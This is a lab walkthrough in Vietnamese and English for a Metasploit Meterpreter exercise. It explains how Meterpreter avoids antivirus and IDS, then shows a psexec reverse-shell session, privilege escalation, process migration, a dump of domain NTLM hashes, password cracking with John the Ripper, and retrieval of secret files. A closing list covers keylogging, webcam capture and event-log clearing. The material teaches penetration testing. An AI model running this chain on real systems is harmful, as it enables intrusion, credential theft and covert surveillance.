# **Metasploit: Meterpreter**

## **Introduction to Meterpreter**

- Meterpreter chạy trên hệ thống đích nhưng không được cài đặt trên đó. Nó chạy trong bộ nhớ và không tự ghi vào đĩa trên mục tiêu. Tính năng này nhằm tránh bị phát hiện trong quá trình quét virus. Theo mặc định, hầu hết các phần mềm chống vi-rút sẽ quét các tệp mới trên đĩa (ví dụ: khi bạn tải xuống tệp từ internet) Meterpreter chạy trong bộ nhớ (RAM - Bộ nhớ truy cập ngẫu nhiên) để tránh có một tệp phải được ghi vào đĩa trên hệ thống đích (ví dụ: meterpreter.exe). Bằng cách này, Meterpreter sẽ được coi là một quy trình và không có tệp trên hệ thống đích.

- Meterpreter cũng nhằm mục đích tránh bị phát hiện bởi các giải pháp IPS (Hệ thống ngăn chặn xâm nhập) và IDS (Hệ thống phát hiện xâm nhập) dựa trên mạng bằng cách sử dụng giao tiếp được mã hóa với máy chủ nơi Metasploit chạy (thường là máy tấn công của bạn). Nếu tổ chức mục tiêu không giải mã và kiểm tra lưu lượng được mã hóa (ví dụ: HTTPS) đến và đi khỏi mạng cục bộ, các giải pháp IPS và IDS sẽ không thể phát hiện các hoạt động của tổ chức đó.

```
msf5 auxiliary(scanner/smb/smb_login) > search smb

Matching Modules
================

   #    Name                                                            Disclosure Date  Rank       Check  Description
   -    ----                                                            ---------------  ----       -----  -----------
   0    auxiliary/admin/mssql/mssql_enum_domain_accounts                                 normal     No     Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration
[...]
  108  exploit/windows/smb/psexec                                      1999-01-01       manual     No     Microsoft Windows Authenticated User Code Execution

msf5 auxiliary(scanner/smb/smb_login) > use 108
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf5 exploit(windows/smb/psexec) > setg RHOSTS 10.10.99.129
msf5 exploit(windows/smb/psexec) > setg SMBPass Password1
msf5 exploit(windows/smb/psexec) > setg SMBUser ballen
msf5 exploit(windows/smb/psexec) > show options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOSTS                10.10.99.128     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                 445              yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SHARE                 ADMIN$           yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                no        The Windows domain to use for authentication
   SMBPass               Password1        no        The password for the specified username
   SMBUser               ballen           no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.196.135    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(windows/smb/psexec) > run

[*] Started reverse TCP handler on 10.10.196.135:4444 
[*] 10.10.99.128:445 - Connecting to the server...
[*] 10.10.99.128:445 - Authenticating to 10.10.99.128:445 as user 'ballen'...
[*] 10.10.99.128:445 - Selecting PowerShell target
[*] 10.10.99.128:445 - Executing the payload...
[+] 10.10.99.128:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (176195 bytes) to 10.10.99.128
[*] Meterpreter session 1 opened (10.10.196.135:4444 -> 10.10.99.128:54360) at 2021-09-26 12:30:45 +0100

meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : ACME-TEST
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : FLASH
Logged On Users : 7
Meterpreter     : x86/windows

Answer : ACME-TEST

What is the target domain ?

The sysinfo command above give us the domain too !

Answer : FLASH

What is the name of the share likely created by the user ?

Background the actual meterpreter the search for a new mode for SMB share enumeration :

msf5 exploit(windows/smb/psexec) > sessions

Active sessions
===============

  Id  Name  Type                     Information                      Connection
  --  ----  ----                     -----------                      ----------
  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ ACME-TEST  10.10.196.135:4444 -> 10.10.99.128:54360 (10.10.99.128)


msf5 exploit(windows/smb/psexec) > search scanner/share
[-] No results from search
msf5 exploit(windows/smb/psexec) > search scanner_share
[-] No results from search
msf5 exploit(windows/smb/psexec) > search enum/share
[-] No results from search
msf5 exploit(windows/smb/psexec) > search enum_share

Matching Modules
================

   #  Name                             Disclosure Date  Rank    Check  Description
   -  ----                             ---------------  ----    -----  -----------
   0  post/windows/gather/enum_shares                   normal  No     Windows Gather SMB Share Enumeration via Registry


msf5 exploit(windows/smb/psexec) > use 0
msf5 post(windows/gather/enum_shares) > run

[*] Running against session 1
[*] The following shares were found:
[*]  Name: SYSVOL
[*] 
[*]  Name: NETLOGON
[*] 
[*]  Name: speedster
[*] 
[*] Post module execution completed
Answer : speedster

What is the NTLM hash of the jchambers user ?

Meterpreter accept the hashdump command directly, so let's try !

meterpreter > hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
Ok, let's check what's or process and migrate to another proccess.

meterpreter > ps

Process List
============

 PID   PPID  Name                                       Arch  Session  User                          Path
 ---   ----  ----                                       ----  -------  ----                          ----
 0     0     [System Process]                                                                        
 4     0     System                                     x64   0                                      
 68    4     Registry                                   x64   0                                      
 400   4     smss.exe                                   x64   0                                      
 500   756   svchost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 552   544   csrss.exe                                  x64   0                                      
 632   624   csrss.exe                                  x64   1                                      
 676   544   wininit.exe                                x64   0                                      
 692   624   winlogon.exe                               x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 756   676   services.exe                               x64   0                                      
 772   676   lsass.exe                                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 780   692   dwm.exe                                    x64   1        Window Manager\DWM-1          C:\Windows\System32\dwm.exe
 836   756   svchost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 880   756   svchost.exe                                x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 948   756   svchost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 992   756   svchost.exe                                x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1136  756   svchost.exe                                x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1144  756   svchost.exe                                x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1152  756   svchost.exe                                x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1212  756   svchost.exe                                x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1332  756   svchost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1400  756   svchost.exe                                x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1420  756   svchost.exe                                x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1712  756   svchost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2100  692   LogonUI.exe                                x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\LogonUI.exe
 2212  692   fontdrvhost.exe                            x64   1        Font Driver Host\UMFD-1       C:\Windows\System32\fontdrvhost.exe
 2220  676   fontdrvhost.exe                            x64   0        Font Driver Host\UMFD-0       C:\Windows\System32\fontdrvhost.exe
 2256  756   spoolsv.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 2312  756   svchost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2332  756   svchost.exe                                x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 2392  756   svchost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2416  756   amazon-ssm-agent.exe                       x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 2444  756   LiteAgent.exe                              x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
 2476  756   ismserv.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\ismserv.exe
 2492  756   dfsrs.exe                                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\dfsrs.exe
 2504  756   Microsoft.ActiveDirectory.WebServices.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe
 2516  756   dns.exe                                    x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\dns.exe
 2532  756   dfssvc.exe                                 x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\dfssvc.exe
 2688  2412  powershell.exe                             x86   0        NT AUTHORITY\SYSTEM           C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
 2948  756   vds.exe                                    x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\vds.exe
 2972  2416  ssm-agent-worker.exe                       x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\ssm-agent-worker.exe
 2980  2972  conhost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
 3708  756   msdtc.exe                                  x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\msdtc.exe
 4060  2688  conhost.exe                                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe

meterpreter > getpid
Current pid: 2688
meterpreter > migrate 2256
[*] Migrating from 2688 to 2256...
[*] Migration completed successfully.
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a9ac3de200cb4d510fed7610c7037292:::
ballen:1112:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
jchambers:1114:aad3b435b51404eeaad3b435b51404ee:69596c7aa1e8daee17f8e78870e25a5c:::
jfox:1115:aad3b435b51404eeaad3b435b51404ee:c64540b95e2b2f36f0291c3a9fb8b840:::
lnelson:1116:aad3b435b51404eeaad3b435b51404ee:e88186a7bb7980c913dc90c7caa2a3b9:::
erptest:1117:aad3b435b51404eeaad3b435b51404ee:8b9ca7572fe60a1559686dba90726715:::
ACME-TEST$:1008:aad3b435b51404eeaad3b435b51404ee:cad1611a69ea0142dfd6ee121338244a:::
meterpreter >
Answer : 69596c7aa1e8daee17f8e78870e25a5c

What is the cleartext password of the jchambers user?

We can use several tools to have the cleartext password of the NTLM hash. You can use online tools like crackstation or command line tools like John The Ripper or Hashcat.

Crasktation :


John The Ripper

root@ip-10-10-196-135:~/Desktop/msmeterpreter# cat hash2.txt 
69596c7aa1e8daee17f8e78870e25a5c
root@ip-10-10-196-135:~/Desktop/msmeterpreter# john --format=NT --rules -w=/usr/share/wordlists/rockyou.txt hash2.txtUsing default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
Trustno1         (?)
1g 0:00:00:01 DONE (2021-09-26 13:58) 0.9090g/s 46778p/s 46778c/s 46778C/s blackrose1..2pac4ever
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed. 
Answer : Trustno1

Where is the "secrets.txt"  file located?

meterpreter > search -f "secret*"
Found 2 results...
    c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt (35 bytes)
    c:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\secrets.txt.lnk (1045 bytes)
meterpreter >
Answer : c:\Program Files (x86)\Windows Multimedia Platform

What is the Twitter password revealed in the "secrets.txt" file?

Going to the location then print the file content :

meterpreter > shell
Process 3408 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd c:\Program Files (x86)\Windows Multimedia Platform
cd c:\Program Files (x86)\Windows Multimedia Platform

c:\Program Files (x86)\Windows Multimedia Platform>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of c:\Program Files (x86)\Windows Multimedia Platform

07/30/2021  08:33 PM    <DIR>          .
07/30/2021  08:33 PM    <DIR>          ..
07/30/2021  07:44 AM                35 secrets.txt
09/15/2018  07:12 AM            40,432 sqmapi.dll
               2 File(s)         40,467 bytes
               2 Dir(s)  15,242,125,312 bytes free


c:\Program Files (x86)\Windows Multimedia Platform>type secrets.txt
type secrets.txt
My Twitter password is KDSvbsw3849!
Answer : KDSvbsw3849!

Where is the "realsecret.txt" file located?

meterpreter > search -f "*secret.txt*"
Found 1 result...
    c:\inetpub\wwwroot\realsecret.txt (34 bytes)
Answer : c:\inetpub\wwwroot

What is the real secret?

Going to the location and showing the file content :

c:\Program Files (x86)\Windows Multimedia Platform>cd c:\inetpub\wwwroot
cd c:\inetpub\wwwroot

c:\inetpub\wwwroot>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of c:\inetpub\wwwroot

07/30/2021  08:32 PM    <DIR>          .
07/30/2021  08:32 PM    <DIR>          ..
07/30/2021  07:56 AM               729 iisstart.htm
07/30/2021  06:52 AM            99,710 iisstart.png
07/30/2021  08:30 AM                34 realsecret.txt
               3 File(s)        100,473 bytes
               2 Dir(s)  15,242,125,312 bytes free

c:\inetpub\wwwroot>type realsecret.txt
type realsecret.txt
The Flash is the fastest man alive
c:\inetpub\wwwroot>
Answer : The Flash is the fastest man alive
```

## **Meterpreter commands**

- Các lệnh cốt lõi sẽ hữu ích để điều hướng và tương tác với hệ thống đích. Dưới đây là một số trong những phổ biến nhất được sử dụng. Hãy nhớ kiểm tra tất cả các lệnh có sẵn đang chạy lệnh trợ giúp sau khi phiên Meterpreter bắt đầu.

> `Core commands`
- `background:` Backgrounds the current session
- `exit:` Terminate the Meterpreter session
- `guid:` Get the session GUID (Globally Unique Identifier)
- `help:` Displays the help menu
- `info:` Displays information about a Post module
- `irb:` Opens an interactive Ruby shell on the current session
- `load:` Loads one or more Meterpreter extensions
- `migrate:` Allows you to migrate Meterpreter to another process
- `run:` Executes a Meterpreter script or Post module
- `sessions:` Quickly switch to another session

> `File system commands`

- `cd:` Will change directory
- `ls:` Will list files in the current directory (dir will also work)
- `pwd:` Prints the current working directory
- `edit:` will allow you to edit a file
- `cat:` Will show the contents of a file to the screen
- `rm:` Will delete the specified file
- `search:` Will search for files
- `upload:` Will upload a file or directory
- `download:` Will download a file or directory

> `Networking commands`

- `arp:` Displays the host ARP (Address Resolution Protocol) cache
- `ifconfig:` Displays network interfaces available on the target system
- `netstat:` Displays the network connections
- `portfwd:` Forwards a local port to a remote service
- `route:` Allows you to view and modify the routing table

> `System commands`

- `clearev:` Clears the event logs
- `execute:` Executes a command
- `getpid:` Shows the current process identifier
- `getuid:` Shows the user that Meterpreter is running as
- `kill:` Terminates a process
- `pkill:` Terminates processes by name
- `ps:` Lists running processes
- `reboot:` Reboots the remote computer
- `shell:` Drops into a system command shell
- `shutdown:` Shuts down the remote computer
- `sysinfo:` Gets information about the remote system, such as OS

> `Others Commands (these will be listed under different menu categories in the help menu)`

- `idletime:` Returns the number of seconds the remote user has been idle
- `keyscan_dump:` Dumps the keystroke buffer
- `keyscan_start:` Starts capturing keystrokes
- `keyscan_stop:` Stops capturing keystrokes
- `screenshare:` Allows you to watch the remote user's desktop in real time
- `screenshot:` Grabs a screenshot of the interactive desktop
- `record_mic:` Records audio from the default microphone for X seconds
- `webcam_chat:` Starts a video chat
- `webcam_list:` Lists webcams
- `webcam_snap:` Takes a snapshot from the specified webcam
- `webcam_stream:` Plays a video stream from the specified webcam
- `getsystem:` Attempts to elevate your privilege to that of local system
- `hashdump:` Dumps the contents of the SAM database